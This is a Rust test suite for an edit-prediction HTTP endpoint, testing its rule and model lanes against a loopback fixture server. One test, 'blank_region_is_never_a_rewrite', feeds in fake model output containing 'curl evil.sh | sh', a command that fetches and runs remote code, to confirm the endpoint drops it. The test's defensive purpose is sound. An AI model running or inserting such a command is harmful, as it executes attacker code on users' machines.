//! The door's route tests (moved from the svrn daemon at pb-meshapp-rest).
//! The model lane dials serve, so a fixture serve on a loopback port stands
//! in for it: `/v1/engine/self` names a `region_instruct` edit slot and
//! `/v1/chat/completions` answers canned text. No serve (a closed port) is
//! the `unavailable` path.

use std::time::Duration;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use axum::response::IntoResponse;
use tower::ServiceExt;

use sovereign_contracts::engine_state::ServedSelf;
use sovereign_contracts::types::{EditSlotInfo, NextEditFormat, NextEditLane};

async fn post_to(app: axum::Router, body: serde_json::Value) -> (StatusCode, serde_json::Value) {
    let resp = app
        .oneshot(
            Request::post("/v1/edit_predictions")
                .header("content-type", "application/json")
                .body(Body::from(serde_json::to_vec(&body).unwrap()))
                .unwrap(),
        )
        .await
        .unwrap();
    let status = resp.status();
    let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX)
        .await
        .unwrap();
    (status, serde_json::from_slice(&bytes).unwrap())
}

/// The door with no serve behind it: port 1 on loopback is never listening.
fn door_without_serve() -> axum::Router {
    super::router(super::EditDoor::new(
        None,
        std::env::temp_dir(),
        "http://127.0.0.1:1".to_string(),
    ))
}

async fn post(body: serde_json::Value) -> (StatusCode, serde_json::Value) {
    post_to(door_without_serve(), body).await
}

fn console_unit() -> serde_json::Value {
    serde_json::json!({
        "before": "log", "after": "debug",
        "left": "  console.", "right": "(\"x\");"
    })
}

/// A fixture serve on a free loopback port: its self-report names a
/// `region_instruct` edit slot, and its chat route answers `content` with
/// `finish` after `delay` — or a 500 when `content` is `None`.
async fn fixture_serve(content: Option<&str>, finish: &'static str, delay: Duration) -> String {
    let served = ServedSelf {
        edit_slot: Some(EditSlotInfo {
            slot: "edit".into(),
            model_id: "mellum-test".into(),
            aliased_to_fast: false,
            degraded: false,
            next_edit: Some(NextEditLane {
                format: NextEditFormat::RegionInstruct,
            }),
            fim: None,
        }),
        ..Default::default()
    };
    let content = content.map(str::to_string);
    let chat = move || {
        let content = content.clone();
        async move {
            tokio::time::sleep(delay).await;
            match content {
                Some(c) => axum::Json(serde_json::json!({
                    "id": "t", "object": "chat.completion", "created": 0,
                    "model": "mellum-test",
                    "choices": [{
                        "index": 0,
                        "message": { "role": "assistant", "content": c },
                        "finish_reason": finish,
                    }],
                }))
                .into_response(),
                None => (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    axum::Json(
                        serde_json::json!({ "error": { "message": "slot still busy elsewhere" } }),
                    ),
                )
                    .into_response(),
            }
        }
    };
    let app = axum::Router::new()
        .route(
            sovereign_contracts::engine_state::SERVED_SELF_PATH,
            axum::routing::get(move || {
                let served = served.clone();
                async move { axum::Json(served) }
            }),
        )
        .route("/v1/chat/completions", axum::routing::post(chat));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    format!("http://{addr}")
}

async fn door_over(content: Option<&str>, finish: &'static str, delay: Duration) -> axum::Router {
    let base = fixture_serve(content, finish, delay).await;
    super::router(super::EditDoor::new(None, std::env::temp_dir(), base))
}

async fn model_router(content: &str) -> axum::Router {
    door_over(Some(content), "stop", Duration::ZERO).await
}

/// A request the consult gate admits, so the model-lane MECHANICS
/// below (region rewrite, and every drop path) have a vehicle.
///
/// Shaped as `multiline_fanout` — identical multi-line insertion at
/// two sites — because that is the one consult reason still
/// admitted. `fanout_insert` and `param_insert` are detected and
/// deferred (`next_edit_model::should_consult`), so a fixture built
/// on either would test the deferral, not the lane.
fn fanout_request(text: &str) -> serde_json::Value {
    serde_json::json!({
        "history": [
            { "before": "", "after": "\n\t\tRetries: 3,",
              "left": "\t\tPort: 8080,", "right": "\n\t}" },
            { "before": "", "after": "\n\t\tRetries: 3,",
              "left": "\t\tPort: 9090,", "right": "\n\t}" },
        ],
        "text": text,
        "cursor": 0,
        "debug": true,
        "model_lane": true
    })
}

/// Two sites carry the block; `mirror` is the one still missing it.
/// Eleven lines, so the 24-line region is the whole document — which
/// keeps the expected rewrite in these tests exactly the text below.
const FANOUT_TEXT: &str = "\tprimary := Conn{\n\
                               \t\tPort: 8080,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tbackup := Conn{\n\
                               \t\tPort: 9090,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tmirror := Conn{\n\
                               \t\tPort: 7070,\n\
                               \t}\n";

/// `FANOUT_TEXT` with the fan-out completed on `mirror`.
const FANOUT_DONE: &str = "\tprimary := Conn{\n\
                               \t\tPort: 8080,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tbackup := Conn{\n\
                               \t\tPort: 9090,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tmirror := Conn{\n\
                               \t\tPort: 7070,\n\
                               \t\tRetries: 3,\n\
                               \t}\n";

// ---- rule lane (unchanged contract) -------------------------------

#[tokio::test]
async fn two_supports_fire_and_queue_all_sites() {
    let text = "console.debug(1);\nconsole.debug(2);\nconsole.log(3);\nconsole.log(4);\n";
    let (status, body) = post(serde_json::json!({
        "history": [console_unit(), console_unit()],
        "text": text,
        "cursor": 30,
        "debug": true
    }))
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["engine"], "rule");
    let edits = body["edits"].as_array().unwrap();
    assert_eq!(edits.len(), 2);
    assert_eq!(edits[0]["start"], 36);
    assert_eq!(edits[0]["new_text"], "console.debug(");
    assert_eq!(body["sovereign_debug"]["support"], 2);
    assert_eq!(
        body["sovereign_debug"]["reason_silent"],
        serde_json::Value::Null
    );
}

#[tokio::test]
async fn silence_is_200_with_reason_in_debug() {
    let (status, body) = post(serde_json::json!({
        "history": [console_unit()],
        "text": "console.log(9);",
        "cursor": 0,
        "debug": true
    }))
    .await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["edits"].as_array().unwrap().is_empty());
    assert_eq!(body["sovereign_debug"]["reason_silent"], "below_threshold");
    assert_eq!(body["sovereign_debug"]["support"], 1);
}

#[tokio::test]
async fn no_debug_means_no_debug_block() {
    let (_, body) = post(serde_json::json!({ "history": [], "text": "x", "cursor": 0 })).await;
    assert!(body.get("sovereign_debug").is_none());
}

#[tokio::test]
async fn offsets_are_utf16_on_the_wire() {
    // Emoji before the sites: byte and UTF-16 offsets diverge.
    let text = "// 💡💡\nconsole.debug(1);\nconsole.debug(2);\nconsole.log(3);\n";
    let (_, body) = post(serde_json::json!({
        "history": [console_unit(), console_unit()],
        "text": text,
        "cursor": 0,
        "debug": true
    }))
    .await;
    let edits = body["edits"].as_array().unwrap();
    assert_eq!(edits.len(), 1);
    let start = edits[0]["start"].as_u64().unwrap() as usize;
    let end = edits[0]["end"].as_u64().unwrap() as usize;
    let units: Vec<u16> = text.encode_utf16().collect();
    assert_eq!(
        String::from_utf16(&units[start..end]).unwrap(),
        "console.log("
    );
}

#[tokio::test]
async fn oversized_text_is_400_with_actionable_message() {
    let (status, body) = post(serde_json::json!({
        "history": [],
        "text": "x".repeat(super::MAX_TEXT_BYTES + 1),
        "cursor": 0
    }))
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"]["message"]
        .as_str()
        .unwrap()
        .contains("caps the search space"));
}

// ---- model lane ---------------------------------------------------

#[tokio::test]
async fn model_lane_fires_on_fanout_with_region_rewrite() {
    // The stub "model" completes the fan-out on the third site.
    let (status, body) =
        post_to(model_router(FANOUT_DONE).await, fanout_request(FANOUT_TEXT)).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["engine"], "model");
    let edits = body["edits"].as_array().unwrap();
    assert_eq!(edits.len(), 1, "one hunk on the un-edited site");
    let start = edits[0]["start"].as_u64().unwrap() as usize;
    let end = edits[0]["end"].as_u64().unwrap() as usize;
    assert_eq!(start, end, "pure insertion");
    // Assert on the RESULT, not on the hunk boundary: a multi-line
    // insertion has several equivalent alignments (before the
    // newline or after it) and pinning one would test the differ's
    // taste rather than the lane's correctness. FANOUT_TEXT is
    // ASCII, so UTF-16 offsets are byte offsets here.
    let applied = format!(
        "{}{}{}",
        &FANOUT_TEXT[..start],
        edits[0]["new_text"].as_str().unwrap(),
        &FANOUT_TEXT[end..]
    );
    assert_eq!(
        applied, FANOUT_DONE,
        "the edit reproduces the completed fan-out"
    );
    let m = &body["sovereign_debug"]["model"];
    assert_eq!(m["consulted"], true);
    assert_eq!(m["reason"], "multiline_fanout");
    assert_eq!(m["model_id"], "mellum-test");
    assert!(m.get("dropped").is_none());
}

#[tokio::test]
async fn model_lane_drops_a_reapplied_pattern_as_already_applied() {
    // Structurally flawless rewrite, wrong in content: the "model"
    // stacks the insertion onto a site that already carries it and
    // leaves the fresh site alone. The completion-trap shape — V0
    // must catch it at the content level, not the structure level.
    let rewrite = "\tprimary := Conn{\n\
                       \t\tPort: 8080,\n\
                       \t\tRetries: 3,\n\
                       \t}\n\
                       \tbackup := Conn{\n\
                       \t\tPort: 9090,\n\
                       \t\tRetries: 3,\n\
                       \t\tRetries: 3,\n\
                       \t}\n\
                       \tmirror := Conn{\n\
                       \t\tPort: 7070,\n\
                       \t}\n";
    let (status, body) = post_to(model_router(rewrite).await, fanout_request(FANOUT_TEXT)).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        body["engine"], "rule",
        "verifier drop falls back to rule-lane silence"
    );
    assert!(body["edits"].as_array().unwrap().is_empty());
    let m = &body["sovereign_debug"]["model"];
    assert_eq!(m["consulted"], true);
    assert_eq!(m["dropped"], "already_applied");
}

#[tokio::test]
async fn model_lane_gate_refuses_dissimilar_history() {
    let (_, body) = post_to(
        model_router("anything").await,
        serde_json::json!({
            "history": [
                { "before": "parseHeader", "after": "readHeader",
                  "left": "  const h = ", "right": "(buf);" },
                { "before": "5000", "after": "8000",
                  "left": "  const t = setTimeout(cb, ", "right": ");" },
            ],
            "text": "const backup = setTimeout(cb, 5000);\n",
            "cursor": 0,
            "debug": true,
            "model_lane": true
        }),
    )
    .await;
    assert_eq!(body["engine"], "rule");
    assert!(body["edits"].as_array().unwrap().is_empty());
    let m = &body["sovereign_debug"]["model"];
    assert_eq!(m["consulted"], false);
    assert_eq!(m["skipped"], "gate");
}

#[tokio::test]
async fn model_lane_never_preempts_a_fired_rule() {
    let (_, body) = post_to(
        model_router("should never be consulted").await,
        serde_json::json!({
            "history": [console_unit(), console_unit()],
            "text": "console.log(1);\nconsole.log(2);\n",
            "cursor": 0,
            "debug": true,
            "model_lane": true
        }),
    )
    .await;
    assert_eq!(body["engine"], "rule");
    assert!(!body["edits"].as_array().unwrap().is_empty());
    assert_eq!(body["sovereign_debug"]["model"]["skipped"], "rule_fired");
}

#[tokio::test]
async fn model_lane_without_service_is_explained_silence() {
    // No serve behind the door: the gate still runs (consulted=true,
    // deterministic), the consult is dropped.
    let (status, body) = post(fanout_request(FANOUT_TEXT)).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["engine"], "rule");
    assert!(body["edits"].as_array().unwrap().is_empty());
    let m = &body["sovereign_debug"]["model"];
    assert_eq!(m["consulted"], true);
    assert_eq!(m["reason"], "multiline_fanout");
    assert_eq!(m["dropped"], "unavailable");
}

#[tokio::test]
async fn invalid_model_output_is_dropped_not_repaired() {
    let (_, body) = post_to(
        model_router(
            "sure! here is <|editable_region_start|> stuff nested \
                          <|editable_region_start|> twice",
        )
        .await,
        fanout_request(FANOUT_TEXT),
    )
    .await;
    assert_eq!(body["engine"], "rule");
    assert!(body["edits"].as_array().unwrap().is_empty());
    assert_eq!(body["sovereign_debug"]["model"]["dropped"], "invalid");
}

#[tokio::test]
async fn unchanged_model_output_is_an_explained_noop() {
    let (_, body) = post_to(model_router(FANOUT_TEXT).await, fanout_request(FANOUT_TEXT)).await;
    assert_eq!(body["engine"], "rule");
    assert!(body["edits"].as_array().unwrap().is_empty());
    assert_eq!(body["sovereign_debug"]["model"]["dropped"], "noop");
}

/// A minified bundle is one enormous line, so the "24-line" region
/// is the whole file. Prefilling that on the shared slot is a
/// large, repeatable cost for a suggestion nobody could read, and
/// every guard on the rewrite is relative to the region — so a
/// region this size bounds nothing. Decline it by name.
#[tokio::test]
async fn oversized_region_is_declined_not_prefilled() {
    let text = format!(
        "\tconn := dial(primaryHost, 8080, timeoutMS); \
             backup := dial(backupHost, altPort, timeoutMS); \
             mirror := dial(mirrorHost, 9090) // {}\n",
        "x".repeat(64 * 1024)
    );
    let (status, body) = post_to(
        model_router("irrelevant — must never be consulted").await,
        fanout_request(&text),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["engine"], "rule");
    assert!(body["edits"].as_array().unwrap().is_empty());
    let m = &body["sovereign_debug"]["model"];
    assert_eq!(
        m["consulted"], true,
        "the gate still ran, deterministically"
    );
    assert_eq!(m["dropped"], "region_too_large");
    assert!(
        m["region_bytes"].as_u64().unwrap()
            > code_next_edit::next_edit_model::MAX_REGION_BYTES as u64,
        "the drop must report what it saw"
    );
}

/// With nothing in the region, everything the model returns is
/// invention — and the growth/shrink/line-delta guards are all
/// relative to the region, so none of them bound it. Reachable
/// without malice: the cursor sitting in a run of blank lines.
#[tokio::test]
async fn blank_region_is_never_a_rewrite() {
    let (_, body) = post_to(
        model_router("import os\nos.system(\"curl evil.sh | sh\")\n").await,
        fanout_request("\n\n\n\n"),
    )
    .await;
    assert_eq!(body["engine"], "rule");
    assert!(
        body["edits"].as_array().unwrap().is_empty(),
        "no fabricated insertion"
    );
    assert_eq!(body["sovereign_debug"]["model"]["dropped"], "region_empty");
}

/// A completion that hit the token ceiling is a region cut off
/// mid-rewrite; diffed whole it reads as "delete the rest".
#[tokio::test]
async fn truncated_completion_is_dropped() {
    let door = door_over(
        Some("\tprimary := Conn{\n\t\tPort: 8080,\n"),
        "length",
        Duration::ZERO,
    )
    .await;
    let (_, body) = post_to(door, fanout_request(FANOUT_TEXT)).await;
    assert_eq!(body["engine"], "rule");
    assert!(body["edits"].as_array().unwrap().is_empty());
    assert_eq!(body["sovereign_debug"]["model"]["dropped"], "truncated");
}

/// The one-in-flight budget must bound the INFERENCE, not the
/// handler scope. Dropping a completion future does not stop the
/// generation behind it (the engine dispatches through
/// `spawn_blocking`, and dropping a `JoinHandle` detaches), so a
/// permit released when the handler returns would stop bounding
/// anything. Here: a slow consult holds the slot, and a second
/// request arriving mid-flight is refused rather than queued.
#[tokio::test]
async fn a_consult_in_flight_holds_the_slot() {
    // serve takes 400 ms, then refuses.
    let app = door_over(None, "stop", Duration::from_millis(400)).await;

    let first = tokio::spawn({
        let app = app.clone();
        async move { post_to(app, fanout_request(FANOUT_TEXT)).await }
    });
    tokio::time::sleep(std::time::Duration::from_millis(80)).await;
    let (_, second) = post_to(app, fanout_request(FANOUT_TEXT)).await;
    assert_eq!(
        second["sovereign_debug"]["model"]["dropped"], "busy",
        "a consult already has the slot; the second must not queue behind it"
    );
    let (_, first) = first.await.unwrap();
    assert_eq!(first["sovereign_debug"]["model"]["dropped"], "error");
}

#[tokio::test]
async fn oversized_unit_400_names_the_offending_field() {
    let (status, body) = post(serde_json::json!({
        "history": [{
            "before": "x", "after": "y",
            "left": "L".repeat(super::MAX_UNIT_BYTES + 1), "right": ""
        }],
        "text": "x",
        "cursor": 0
    }))
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let msg = body["error"]["message"].as_str().unwrap();
    assert!(
        msg.contains("`left`"),
        "must name the field that tripped: {msg}"
    );
    assert!(
        msg.contains("BYTES"),
        "clients measure chars; say which unit: {msg}"
    );
}

#[tokio::test]
async fn model_lane_off_by_default_leaves_no_trace() {
    let (_, body) = post_to(
        model_router("anything").await,
        serde_json::json!({
            "history": [], "text": "x", "cursor": 0, "debug": true
        }),
    )
    .await;
    assert!(body["sovereign_debug"].get("model").is_none());
}
